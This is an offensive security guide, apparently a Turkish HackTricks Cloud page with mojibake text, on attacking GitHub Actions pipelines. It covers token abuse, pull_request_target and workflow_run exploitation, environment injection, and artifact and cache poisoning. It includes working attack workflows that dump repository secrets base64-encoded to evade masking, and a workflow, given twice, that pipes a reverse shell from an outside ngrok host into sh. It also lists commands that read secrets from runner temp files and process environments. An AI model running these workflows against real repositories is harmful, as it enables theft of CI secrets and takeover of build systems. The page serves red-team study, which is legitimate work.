# Github Actions'Ä± KÃ¶tÃ¼ye Kullanma

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

## Temel Bilgiler

Bu sayfada bulacaklarÄ±nÄ±z:

* Bir saldÄ±rganÄ±n bir Github Action'a eriÅŸim saÄŸlamasÄ±nÄ±n **tÃ¼m etkilerinin Ã¶zeti**
* Bir action'a **eriÅŸim saÄŸlamak iÃ§in farklÄ± yollar**:
* Action oluÅŸturma **izinlerine** sahip olmak
* **Pull request** ile ilgili tetikleyicileri kÃ¶tÃ¼ye kullanma
* **DiÄŸer dÄ±ÅŸ eriÅŸim** tekniklerini kÃ¶tÃ¼ye kullanma
* Zaten ele geÃ§irilmiÅŸ bir repodan **pivot yapma**
* Son olarak, iÃ§eriden bir action'Ä± kÃ¶tÃ¼ye kullanmak iÃ§in **post-exploitation teknikleri** hakkÄ±nda bir bÃ¶lÃ¼m (belirtilen etkileri gerÃ§ekleÅŸtirmek iÃ§in)

## Etkiler Ã–zeti

[**Github Actions hakkÄ±nda giriÅŸ bilgisi**](../basic-github-information.md#github-actions) iÃ§in buraya bakÄ±n.

Bir **depo**da **keyfi Github action'larÄ± Ã§alÄ±ÅŸtÄ±rabilir/kod enjekte edebilirseniz**, ÅŸunlarÄ± yapabilirsiniz:

* O repo/organizasyondan **gizli bilgileri** **Ã§almak**.
* Sadece enjekte edebiliyorsanÄ±z, workflow'da zaten mevcut olan her ÅŸeyi Ã§alabilirsiniz.
* AWS ve GCP gibi diÄŸer platformlara eriÅŸmek iÃ§in **repo ayrÄ±calÄ±klarÄ±nÄ±** kÃ¶tÃ¼ye kullanmak.
* **Ã–zel iÅŸÃ§ilerde kod Ã§alÄ±ÅŸtÄ±rmak** (Ã¶zel iÅŸÃ§iler kullanÄ±lÄ±yorsa) ve oradan pivot yapmaya Ã§alÄ±ÅŸmak.
* Depo **kodunu** **Ã¼zerine yazmak**.
* Bu, `GITHUB_TOKEN`'Ä±n (varsa) ayrÄ±calÄ±klarÄ±na baÄŸlÄ±dÄ±r.
* **DaÄŸÄ±tÄ±mlarÄ±** ve diÄŸer **artifaktlarÄ±** **ele geÃ§irmek**.
* Kod bir ÅŸey daÄŸÄ±tÄ±yor veya depoluyorsa, bunu deÄŸiÅŸtirebilir ve daha fazla eriÅŸim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" bilgi (`${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'dan gelen), admin bu seÃ§eneÄŸi etkinleÅŸtirdiÄŸinde verilir:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github UygulamasÄ±nÄ±n kullanacaÄŸÄ±** aynÄ± token'dÄ±r, bu yÃ¼zden aynÄ± uÃ§ noktalara eriÅŸebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diÄŸer dahili repolara eriÅŸebilmesi iÃ§in **Ã§apraz-repo** eriÅŸimine izin veren bir [**akÄ±ÅŸ**](https://github.com/github/roadmap/issues/74) yayÄ±nlamalÄ±dÄ±r.
{% endhint %}

Bu token'Ä±n olasÄ± **izinlerini** ÅŸu adreste gÃ¶rebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Token'Ä±n **iÅŸ tamamlandÄ±ktan sonra sÃ¼resinin dolduÄŸunu** unutmayÄ±n.\
Bu token'lar ÅŸu ÅŸekilde gÃ¶rÃ¼nÃ¼r: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceÄŸiniz bazÄ± ilginÃ§ ÅŸeyler:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR OluÅŸtur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Dikkat edin ki, birÃ§ok durumda **Github Actions ortamlarÄ±nda veya gizli anahtarlar iÃ§inde github kullanÄ±cÄ± token'larÄ± bulabilirsiniz**. Bu token'lar size depo ve organizasyon Ã¼zerinde daha fazla ayrÄ±calÄ±k verebilir.
{% endhint %}

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda gizli anahtarlarÄ± listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>SÄ±rlar ile ters kabuk elde etme</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

BaÅŸka kullanÄ±cÄ±larÄ±n depolarÄ±ndaki bir Github Token'a verilen izinleri **loglarÄ± kontrol ederek** kontrol etmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ä°zin Verilen YÃ¼rÃ¼tme

{% hint style="info" %}
Bu, Github actions'Ä± ele geÃ§irmenin en kolay yolu olacaktÄ±r, Ã§Ã¼nkÃ¼ bu durumda **organizasyonda yeni bir depo oluÅŸturma** eriÅŸiminiz veya bir depo Ã¼zerinde **yazma ayrÄ±calÄ±klarÄ±nÄ±z** olduÄŸunu varsayar.

Bu senaryoda iseniz, [Post Exploitation tekniklerini](./#post-exploitation-techniques-from-inside-an-action) kontrol edebilirsiniz.
{% endhint %}

### Depo OluÅŸturmadan YÃ¼rÃ¼tme

Bir organizasyonun Ã¼yeleri **yeni depolar oluÅŸturabiliyorsa** ve github actions'Ä± Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z, **yeni bir depo oluÅŸturabilir ve organizasyon seviyesinde ayarlanan sÄ±rlarÄ± Ã§alabilirsiniz**.

### Yeni Bir Daldan YÃ¼rÃ¼tme

EÄŸer **zaten bir Github Action** yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir depoda **yeni bir dal oluÅŸturabiliyorsanÄ±z**, onu **deÄŸiÅŸtirebilir**, **iÃ§eriÄŸi yÃ¼kleyebilir** ve ardÄ±ndan **yeni daldan bu action'Ä± Ã§alÄ±ÅŸtÄ±rabilirsiniz**. Bu ÅŸekilde **depo ve organizasyon seviyesindeki sÄ±rlarÄ± dÄ±ÅŸarÄ± Ã§Ä±karabilirsiniz** (ancak nasÄ±l adlandÄ±rÄ±ldÄ±klarÄ±nÄ± bilmeniz gerekir).

DeÄŸiÅŸtirilmiÅŸ action'Ä± **manuel olarak**, bir **PR oluÅŸturulduÄŸunda** veya **bazÄ± kodlar yÃ¼klendiÄŸinde** Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirebilirsiniz (ne kadar gÃ¼rÃ¼ltÃ¼ yapmak istediÄŸinize baÄŸlÄ± olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ã‡atallanmÄ±ÅŸ YÃ¼rÃ¼tme

{% hint style="info" %}
Bir saldÄ±rganÄ±n **baÅŸka bir deposunun Github Action'Ä±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±na** izin verebilecek farklÄ± tetikleyiciler vardÄ±r. Bu tetiklenebilir eylemler kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir saldÄ±rgan bunlarÄ± ele geÃ§irebilir.
{% endhint %}

### `pull_request`

Ä°ÅŸ akÄ±ÅŸÄ± tetikleyicisi **`pull_request`**, bazÄ± istisnalar dÄ±ÅŸÄ±nda her pull request alÄ±ndÄ±ÄŸÄ±nda iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±racaktÄ±r: varsayÄ±lan olarak, **ilk kez** **iÅŸbirliÄŸi** yapÄ±yorsanÄ±z, bir **bakÄ±cÄ±nÄ±n** iÅŸ akÄ±ÅŸÄ±nÄ±n **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±** **onaylamasÄ±** gerekecektir:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
VarsayÄ±lan sÄ±nÄ±rlama **ilk kez** katkÄ±da bulunanlar iÃ§in olduÄŸundan, **geÃ§erli bir hata/typo dÃ¼zeltmesi** yaparak katkÄ±da bulunabilir ve ardÄ±ndan **yeni `pull_request` ayrÄ±calÄ±klarÄ±nÄ±zÄ± kÃ¶tÃ¼ye kullanmak iÃ§in diÄŸer PR'leri gÃ¶nderebilirsiniz**.

**Bunu test ettim ve Ã§alÄ±ÅŸmÄ±yor**: ~~BaÅŸka bir seÃ§enek, projeye katkÄ±da bulunan ve hesabÄ±nÄ± silen birinin adÄ±yla bir hesap oluÅŸturmak olabilir.~~
{% endhint %}

AyrÄ±ca, varsayÄ±lan olarak hedef depoya **yazma izinlerini** ve **gizli bilgilere eriÅŸimi** engeller, [**belgelerde**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) belirtildiÄŸi gibi:

> `GITHUB_TOKEN` hariÃ§, **gizli bilgiler bir iÅŸ akÄ±ÅŸÄ± Ã§atallanmÄ±ÅŸ bir depodan tetiklendiÄŸinde Ã§alÄ±ÅŸtÄ±rÄ±cÄ±ya iletilmez**. **`GITHUB_TOKEN` Ã§atallanmÄ±ÅŸ depolardan gelen pull request'lerde salt okunur izinlere sahiptir**.

Bir saldÄ±rgan, Github Action tanÄ±mÄ±nÄ± keyfi ÅŸeyler yÃ¼rÃ¼tmek ve keyfi eylemler eklemek iÃ§in deÄŸiÅŸtirebilir. Ancak, belirtilen sÄ±nÄ±rlamalar nedeniyle gizli bilgileri Ã§alamaz veya depoyu Ã¼zerine yazamaz.

{% hint style="danger" %}
**Evet, saldÄ±rgan PR'de tetiklenecek github action'Ä± deÄŸiÅŸtirirse, kullanÄ±lan Github Action onunki olacak ve orijinal depodan olan deÄŸil!**
{% endhint %}

SaldÄ±rgan yÃ¼rÃ¼tÃ¼len kodu da kontrol ettiÄŸinden, `GITHUB_TOKEN` Ã¼zerinde gizli bilgiler veya yazma izinleri olmasa bile, bir saldÄ±rgan Ã¶rneÄŸin **kÃ¶tÃ¼ amaÃ§lÄ± eserler yÃ¼kleyebilir**.

### **`pull_request_target`**

Ä°ÅŸ akÄ±ÅŸÄ± tetikleyicisi **`pull_request_target`** hedef depoya **yazma iznine** ve **gizli bilgilere eriÅŸime** sahiptir (ve izin istemez).

Ä°ÅŸ akÄ±ÅŸÄ± tetikleyicisi **`pull_request_target`**'Ä±n **temel baÄŸlamda** Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve PR tarafÄ±ndan verilen baÄŸlamda Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± unutmayÄ±n (gÃ¼venilmeyen kodu **Ã§alÄ±ÅŸtÄ±rmamak** iÃ§in). `pull_request_target` hakkÄ±nda daha fazla bilgi iÃ§in [**belgeleri kontrol edin**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
AyrÄ±ca, bu Ã¶zel tehlikeli kullanÄ±m hakkÄ±nda daha fazla bilgi iÃ§in bu [**github blog yazÄ±sÄ±nÄ±**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) kontrol edin.

**Ã‡alÄ±ÅŸtÄ±rÄ±lan iÅŸ akÄ±ÅŸÄ±** PR'de tanÄ±mlanan deÄŸil, **temelde tanÄ±mlanan** olduÄŸu iÃ§in **`pull_request_target`** kullanmanÄ±n **gÃ¼venli** olduÄŸunu dÃ¼ÅŸÃ¼nebilirsiniz, ancak **birkaÃ§ durumda gÃ¼venli deÄŸildir**.

Ve bu, **gizli bilgilere eriÅŸime** sahip olacaktÄ±r.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyicisi, bir iÅŸ akÄ±ÅŸÄ± `tamamlandÄ±ÄŸÄ±nda`, `talep edildiÄŸinde` veya `devam ederken` baÅŸka bir iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmaya izin verir.

Bu Ã¶rnekte, ayrÄ± "Testleri Ã‡alÄ±ÅŸtÄ±r" iÅŸ akÄ±ÅŸÄ± tamamlandÄ±ktan sonra bir iÅŸ akÄ±ÅŸÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
AyrÄ±ca, belgelere gÃ¶re: `workflow_run` olayÄ± tarafÄ±ndan baÅŸlatÄ±lan iÅŸ akÄ±ÅŸÄ±, **Ã¶nceki iÅŸ akÄ±ÅŸÄ± olmasa bile sÄ±rlarÄ± ve yazma belirteÃ§lerini eriÅŸebilir**.

Bu tÃ¼r bir iÅŸ akÄ±ÅŸÄ±, **dÄ±ÅŸ kullanÄ±cÄ± tarafÄ±ndan** **`pull_request`** veya **`pull_request_target`** aracÄ±lÄ±ÄŸÄ±yla **tetiklenebilen** bir **iÅŸ akÄ±ÅŸÄ±na** **baÄŸlÄ±ysa** saldÄ±rÄ±ya uÄŸrayabilir. BirkaÃ§ savunmasÄ±z Ã¶rnek [**bu blogda bulunabilir**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Ä°lk Ã¶rnek, saldÄ±rganÄ±n kodunu indiren **`workflow_run`** tetiklenen iÅŸ akÄ±ÅŸÄ±nÄ± iÃ§erir: `${{ github.event.pull_request.head.sha }}`\
Ä°kinci Ã¶rnek, **gÃ¼venilmeyen** koddan bir **artifact** geÃ§irip bu artifact'in iÃ§eriÄŸini **RCE'ye karÅŸÄ± savunmasÄ±z** hale getirecek ÅŸekilde kullanmayÄ± iÃ§erir.

### `workflow_call`

TODO

TODO: pull\_request'ten Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kullanÄ±lan/indirilen kodun orijinalden mi yoksa forked PR'den mi olduÄŸunu kontrol et

## Forked Execution'Ä± KÃ¶tÃ¼ye Kullanma

Bir dÄ±ÅŸ saldÄ±rganÄ±n bir github iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlayabileceÄŸi tÃ¼m yollarÄ± belirttik, ÅŸimdi bu Ã§alÄ±ÅŸtÄ±rmalarÄ±n, kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine bakalÄ±m:

### GÃ¼venilmeyen checkout Ã§alÄ±ÅŸtÄ±rmasÄ±

**`pull_request`** durumunda, iÅŸ akÄ±ÅŸÄ± **PR baÄŸlamÄ±nda** Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r (bu nedenle **kÃ¶tÃ¼ niyetli PR kodunu** Ã§alÄ±ÅŸtÄ±racaktÄ±r), ancak birinin bunu **Ã¶nce yetkilendirmesi** gerekir ve bazÄ± [sÄ±nÄ±rlamalarla](./#pull\_request) Ã§alÄ±ÅŸacaktÄ±r.

**`pull_request_target` veya `workflow_run`** kullanan ve **`pull_request_target` veya `pull_request`** tarafÄ±ndan tetiklenebilen bir iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ± bir iÅŸ akÄ±ÅŸÄ± durumunda, orijinal repo kodu Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, bu nedenle **saldÄ±rgan Ã§alÄ±ÅŸtÄ±rÄ±lan kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, **eylem** **PR checkout**'unu aÃ§Ä±kÃ§a belirtiyorsa ve bu **PR kodunu** (temelden deÄŸil) alacaksa, saldÄ±rganÄ±n kontrol ettiÄŸi kodu kullanacaktÄ±r. Ã–rneÄŸin (PR kodunun indirildiÄŸi 12. satÄ±ra bakÄ±n):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÃœVENSÄ°Z. Sadece Ã¶rnek olarak saÄŸlanmÄ±ÅŸtÄ±r.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

**npm install veya npm build** sÄ±rasÄ±nda potansiyel olarak **gÃ¼venilmeyen kod Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yor** Ã§Ã¼nkÃ¼ build scriptleri ve referans verilen **paketler PR yazarÄ±nÄ±n kontrolÃ¼ndedir**.

{% hint style="warning" %}
SavunmasÄ±z eylemleri aramak iÃ§in bir github dork: `event.pull_request pull_request_target extension:yml` ancak, eylem gÃ¼vensiz yapÄ±landÄ±rÄ±lmÄ±ÅŸ olsa bile iÅŸleri gÃ¼venli bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rmak iÃ§in farklÄ± yollar vardÄ±r (Ã¶rneÄŸin, PR'yi oluÅŸturan aktÃ¶rÃ¼n kim olduÄŸuna dair koÅŸullarÄ± kullanmak gibi).
{% endhint %}

### Context Script EnjeksiyonlarÄ± <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github context**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) deÄŸerlerinin **PR oluÅŸturan kullanÄ±cÄ±** tarafÄ±ndan **kontrol edildiÄŸini** unutmayÄ±n. Github eylemi bu **veriyi bir ÅŸey Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±yorsa**, bu **keyfi kod Ã§alÄ±ÅŸtÄ±rmaya** yol aÃ§abilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelere gÃ¶re: Bir iÅŸ akÄ±ÅŸÄ± iÅŸinde herhangi bir sonraki adÄ±mda kullanÄ±labilir bir **Ã§evre deÄŸiÅŸkeni** tanÄ±mlayarak veya gÃ¼ncelleyerek ve bunu **`GITHUB_ENV`** Ã§evre dosyasÄ±na yazarak kullanÄ±labilir hale getirebilirsiniz.

Bir saldÄ±rgan bu **env** deÄŸiÅŸkenine **herhangi bir deÄŸer enjekte edebilirse**, sonraki adÄ±mlarda kod Ã§alÄ±ÅŸtÄ±rabilecek env deÄŸiÅŸkenlerini (Ã¶rneÄŸin **LD\_PRELOAD** veya **NODE\_OPTIONS**) enjekte edebilir.

Ã–rneÄŸin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), bir iÅŸ akÄ±ÅŸÄ±nÄ±n iÃ§eriÄŸini **`GITHUB_ENV`** env deÄŸiÅŸkeninde saklamak iÃ§in yÃ¼klenen bir artifact'e gÃ¼vendiÄŸini hayal edin. Bir saldÄ±rgan bunu tehlikeye atmak iÃ§in ÅŸÃ¶yle bir ÅŸey yÃ¼kleyebilir:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### SavunmasÄ±z ÃœÃ§Ã¼ncÃ¼ Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**bu blog yazÄ±sÄ±nda**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiÄŸi gibi, bu Github Eylemi farklÄ± iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan artifact'lere eriÅŸim saÄŸlar.

Sorun ÅŸu ki, **`path`** parametresi ayarlanmazsa, artifact mevcut dizine Ã§Ä±karÄ±lÄ±r ve daha sonra kullanÄ±labilecek veya hatta iÅŸ akÄ±ÅŸÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±labilecek dosyalarÄ±n Ã¼zerine yazabilir. Bu nedenle, Artifact savunmasÄ±zsa, bir saldÄ±rgan bunu diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± tehlikeye atmak iÃ§in kÃ¶tÃ¼ye kullanabilir.

SavunmasÄ±z iÅŸ akÄ±ÅŸÄ± Ã¶rneÄŸi:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu, ÅŸu iÅŸ akÄ±ÅŸÄ± ile saldÄ±rÄ±ya uÄŸrayabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## DiÄŸer Harici EriÅŸim

### SilinmiÅŸ Namespace Repo KaÃ§Ä±rma

Bir hesap adÄ±nÄ± deÄŸiÅŸtirirse, bir sÃ¼re sonra baÅŸka bir kullanÄ±cÄ± o adÄ± kullanarak bir hesap oluÅŸturabilir. EÄŸer bir depo **ad deÄŸiÅŸikliÄŸinden Ã¶nce 100 yÄ±ldÄ±zdan az** almÄ±ÅŸsa, Github aynÄ± adÄ± taÅŸÄ±yan yeni kayÄ±tlÄ± kullanÄ±cÄ±ya **aynÄ± adla bir depo oluÅŸturmasÄ±na** izin verir.

{% hint style="danger" %}
Yani bir eylem var olmayan bir hesaptan bir depo kullanÄ±yorsa, bir saldÄ±rganÄ±n o hesabÄ± oluÅŸturup eylemi tehlikeye atmasÄ± hala mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

EÄŸer diÄŸer depolar **bu kullanÄ±cÄ±nÄ±n depolarÄ±ndan baÄŸÄ±mlÄ±lÄ±klar** kullanÄ±yorsa, bir saldÄ±rgan onlarÄ± kaÃ§Ä±rabilir. Daha ayrÄ±ntÄ±lÄ± bir aÃ§Ä±klama iÃ§in buraya bakabilirsiniz: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Bu bÃ¶lÃ¼mde, ilkine bir tÃ¼r eriÅŸimimiz olduÄŸunu varsayarak (Ã¶nceki bÃ¶lÃ¼me bakÄ±n) **bir repodan diÄŸerine geÃ§iÅŸ yapmamÄ±za** olanak tanÄ±yacak tekniklerden bahsedeceÄŸiz.
{% endhint %}

### Cache Poisoning

**AynÄ± dalda yapÄ±lan workflow Ã§alÄ±ÅŸmalarÄ±** arasÄ±nda bir Ã¶nbellek tutulur. Bu, bir saldÄ±rganÄ±n bir **paketi** tehlikeye atmasÄ± ve bu paketin Ã¶nbelleÄŸe alÄ±nmasÄ± ve daha **yetkili** bir workflow tarafÄ±ndan **indirilip** Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± durumunda, o workflow'u da **tehlikeye atabileceÄŸi** anlamÄ±na gelir.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

Workflows **diÄŸer workflows ve hatta repolardan artifactler** kullanabilir, eÄŸer bir saldÄ±rgan bir **artifact yÃ¼kleyen Github Action'Ä±** tehlikeye atarsa ve bu artifact daha sonra baÅŸka bir workflow tarafÄ±ndan kullanÄ±lÄ±rsa, diÄŸer workflows'u da **tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Bir Eylemden Sonra Ä°stismar

### OIDC ile AWS ve GCP'ye EriÅŸim

AÅŸaÄŸÄ±daki sayfalara gÃ¶z atÄ±n:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Secrets EriÅŸimi <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir script'e iÃ§erik enjekte ediyorsanÄ±z, secrets'a nasÄ±l eriÅŸebileceÄŸinizi bilmek ilginÃ§tir:

* EÄŸer secret veya token bir **Ã§evre deÄŸiÅŸkeni** olarak ayarlanmÄ±ÅŸsa, **`printenv`** kullanarak doÄŸrudan Ã§evreden eriÅŸilebilir.

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda secrets listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>SÄ±rlar ile ters kabuk elde etme</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* EÄŸer gizli bilgi **doÄŸrudan bir ifadede** kullanÄ±lÄ±yorsa, oluÅŸturulan kabuk betiÄŸi **diskte** saklanÄ±r ve eriÅŸilebilir.
* ```bash
cat /home/runner/work/_temp/*
```
* Bir JavaScript aksiyonu iÃ§in gizli bilgiler ortam deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir
* ```bash
ps axe | grep node
```
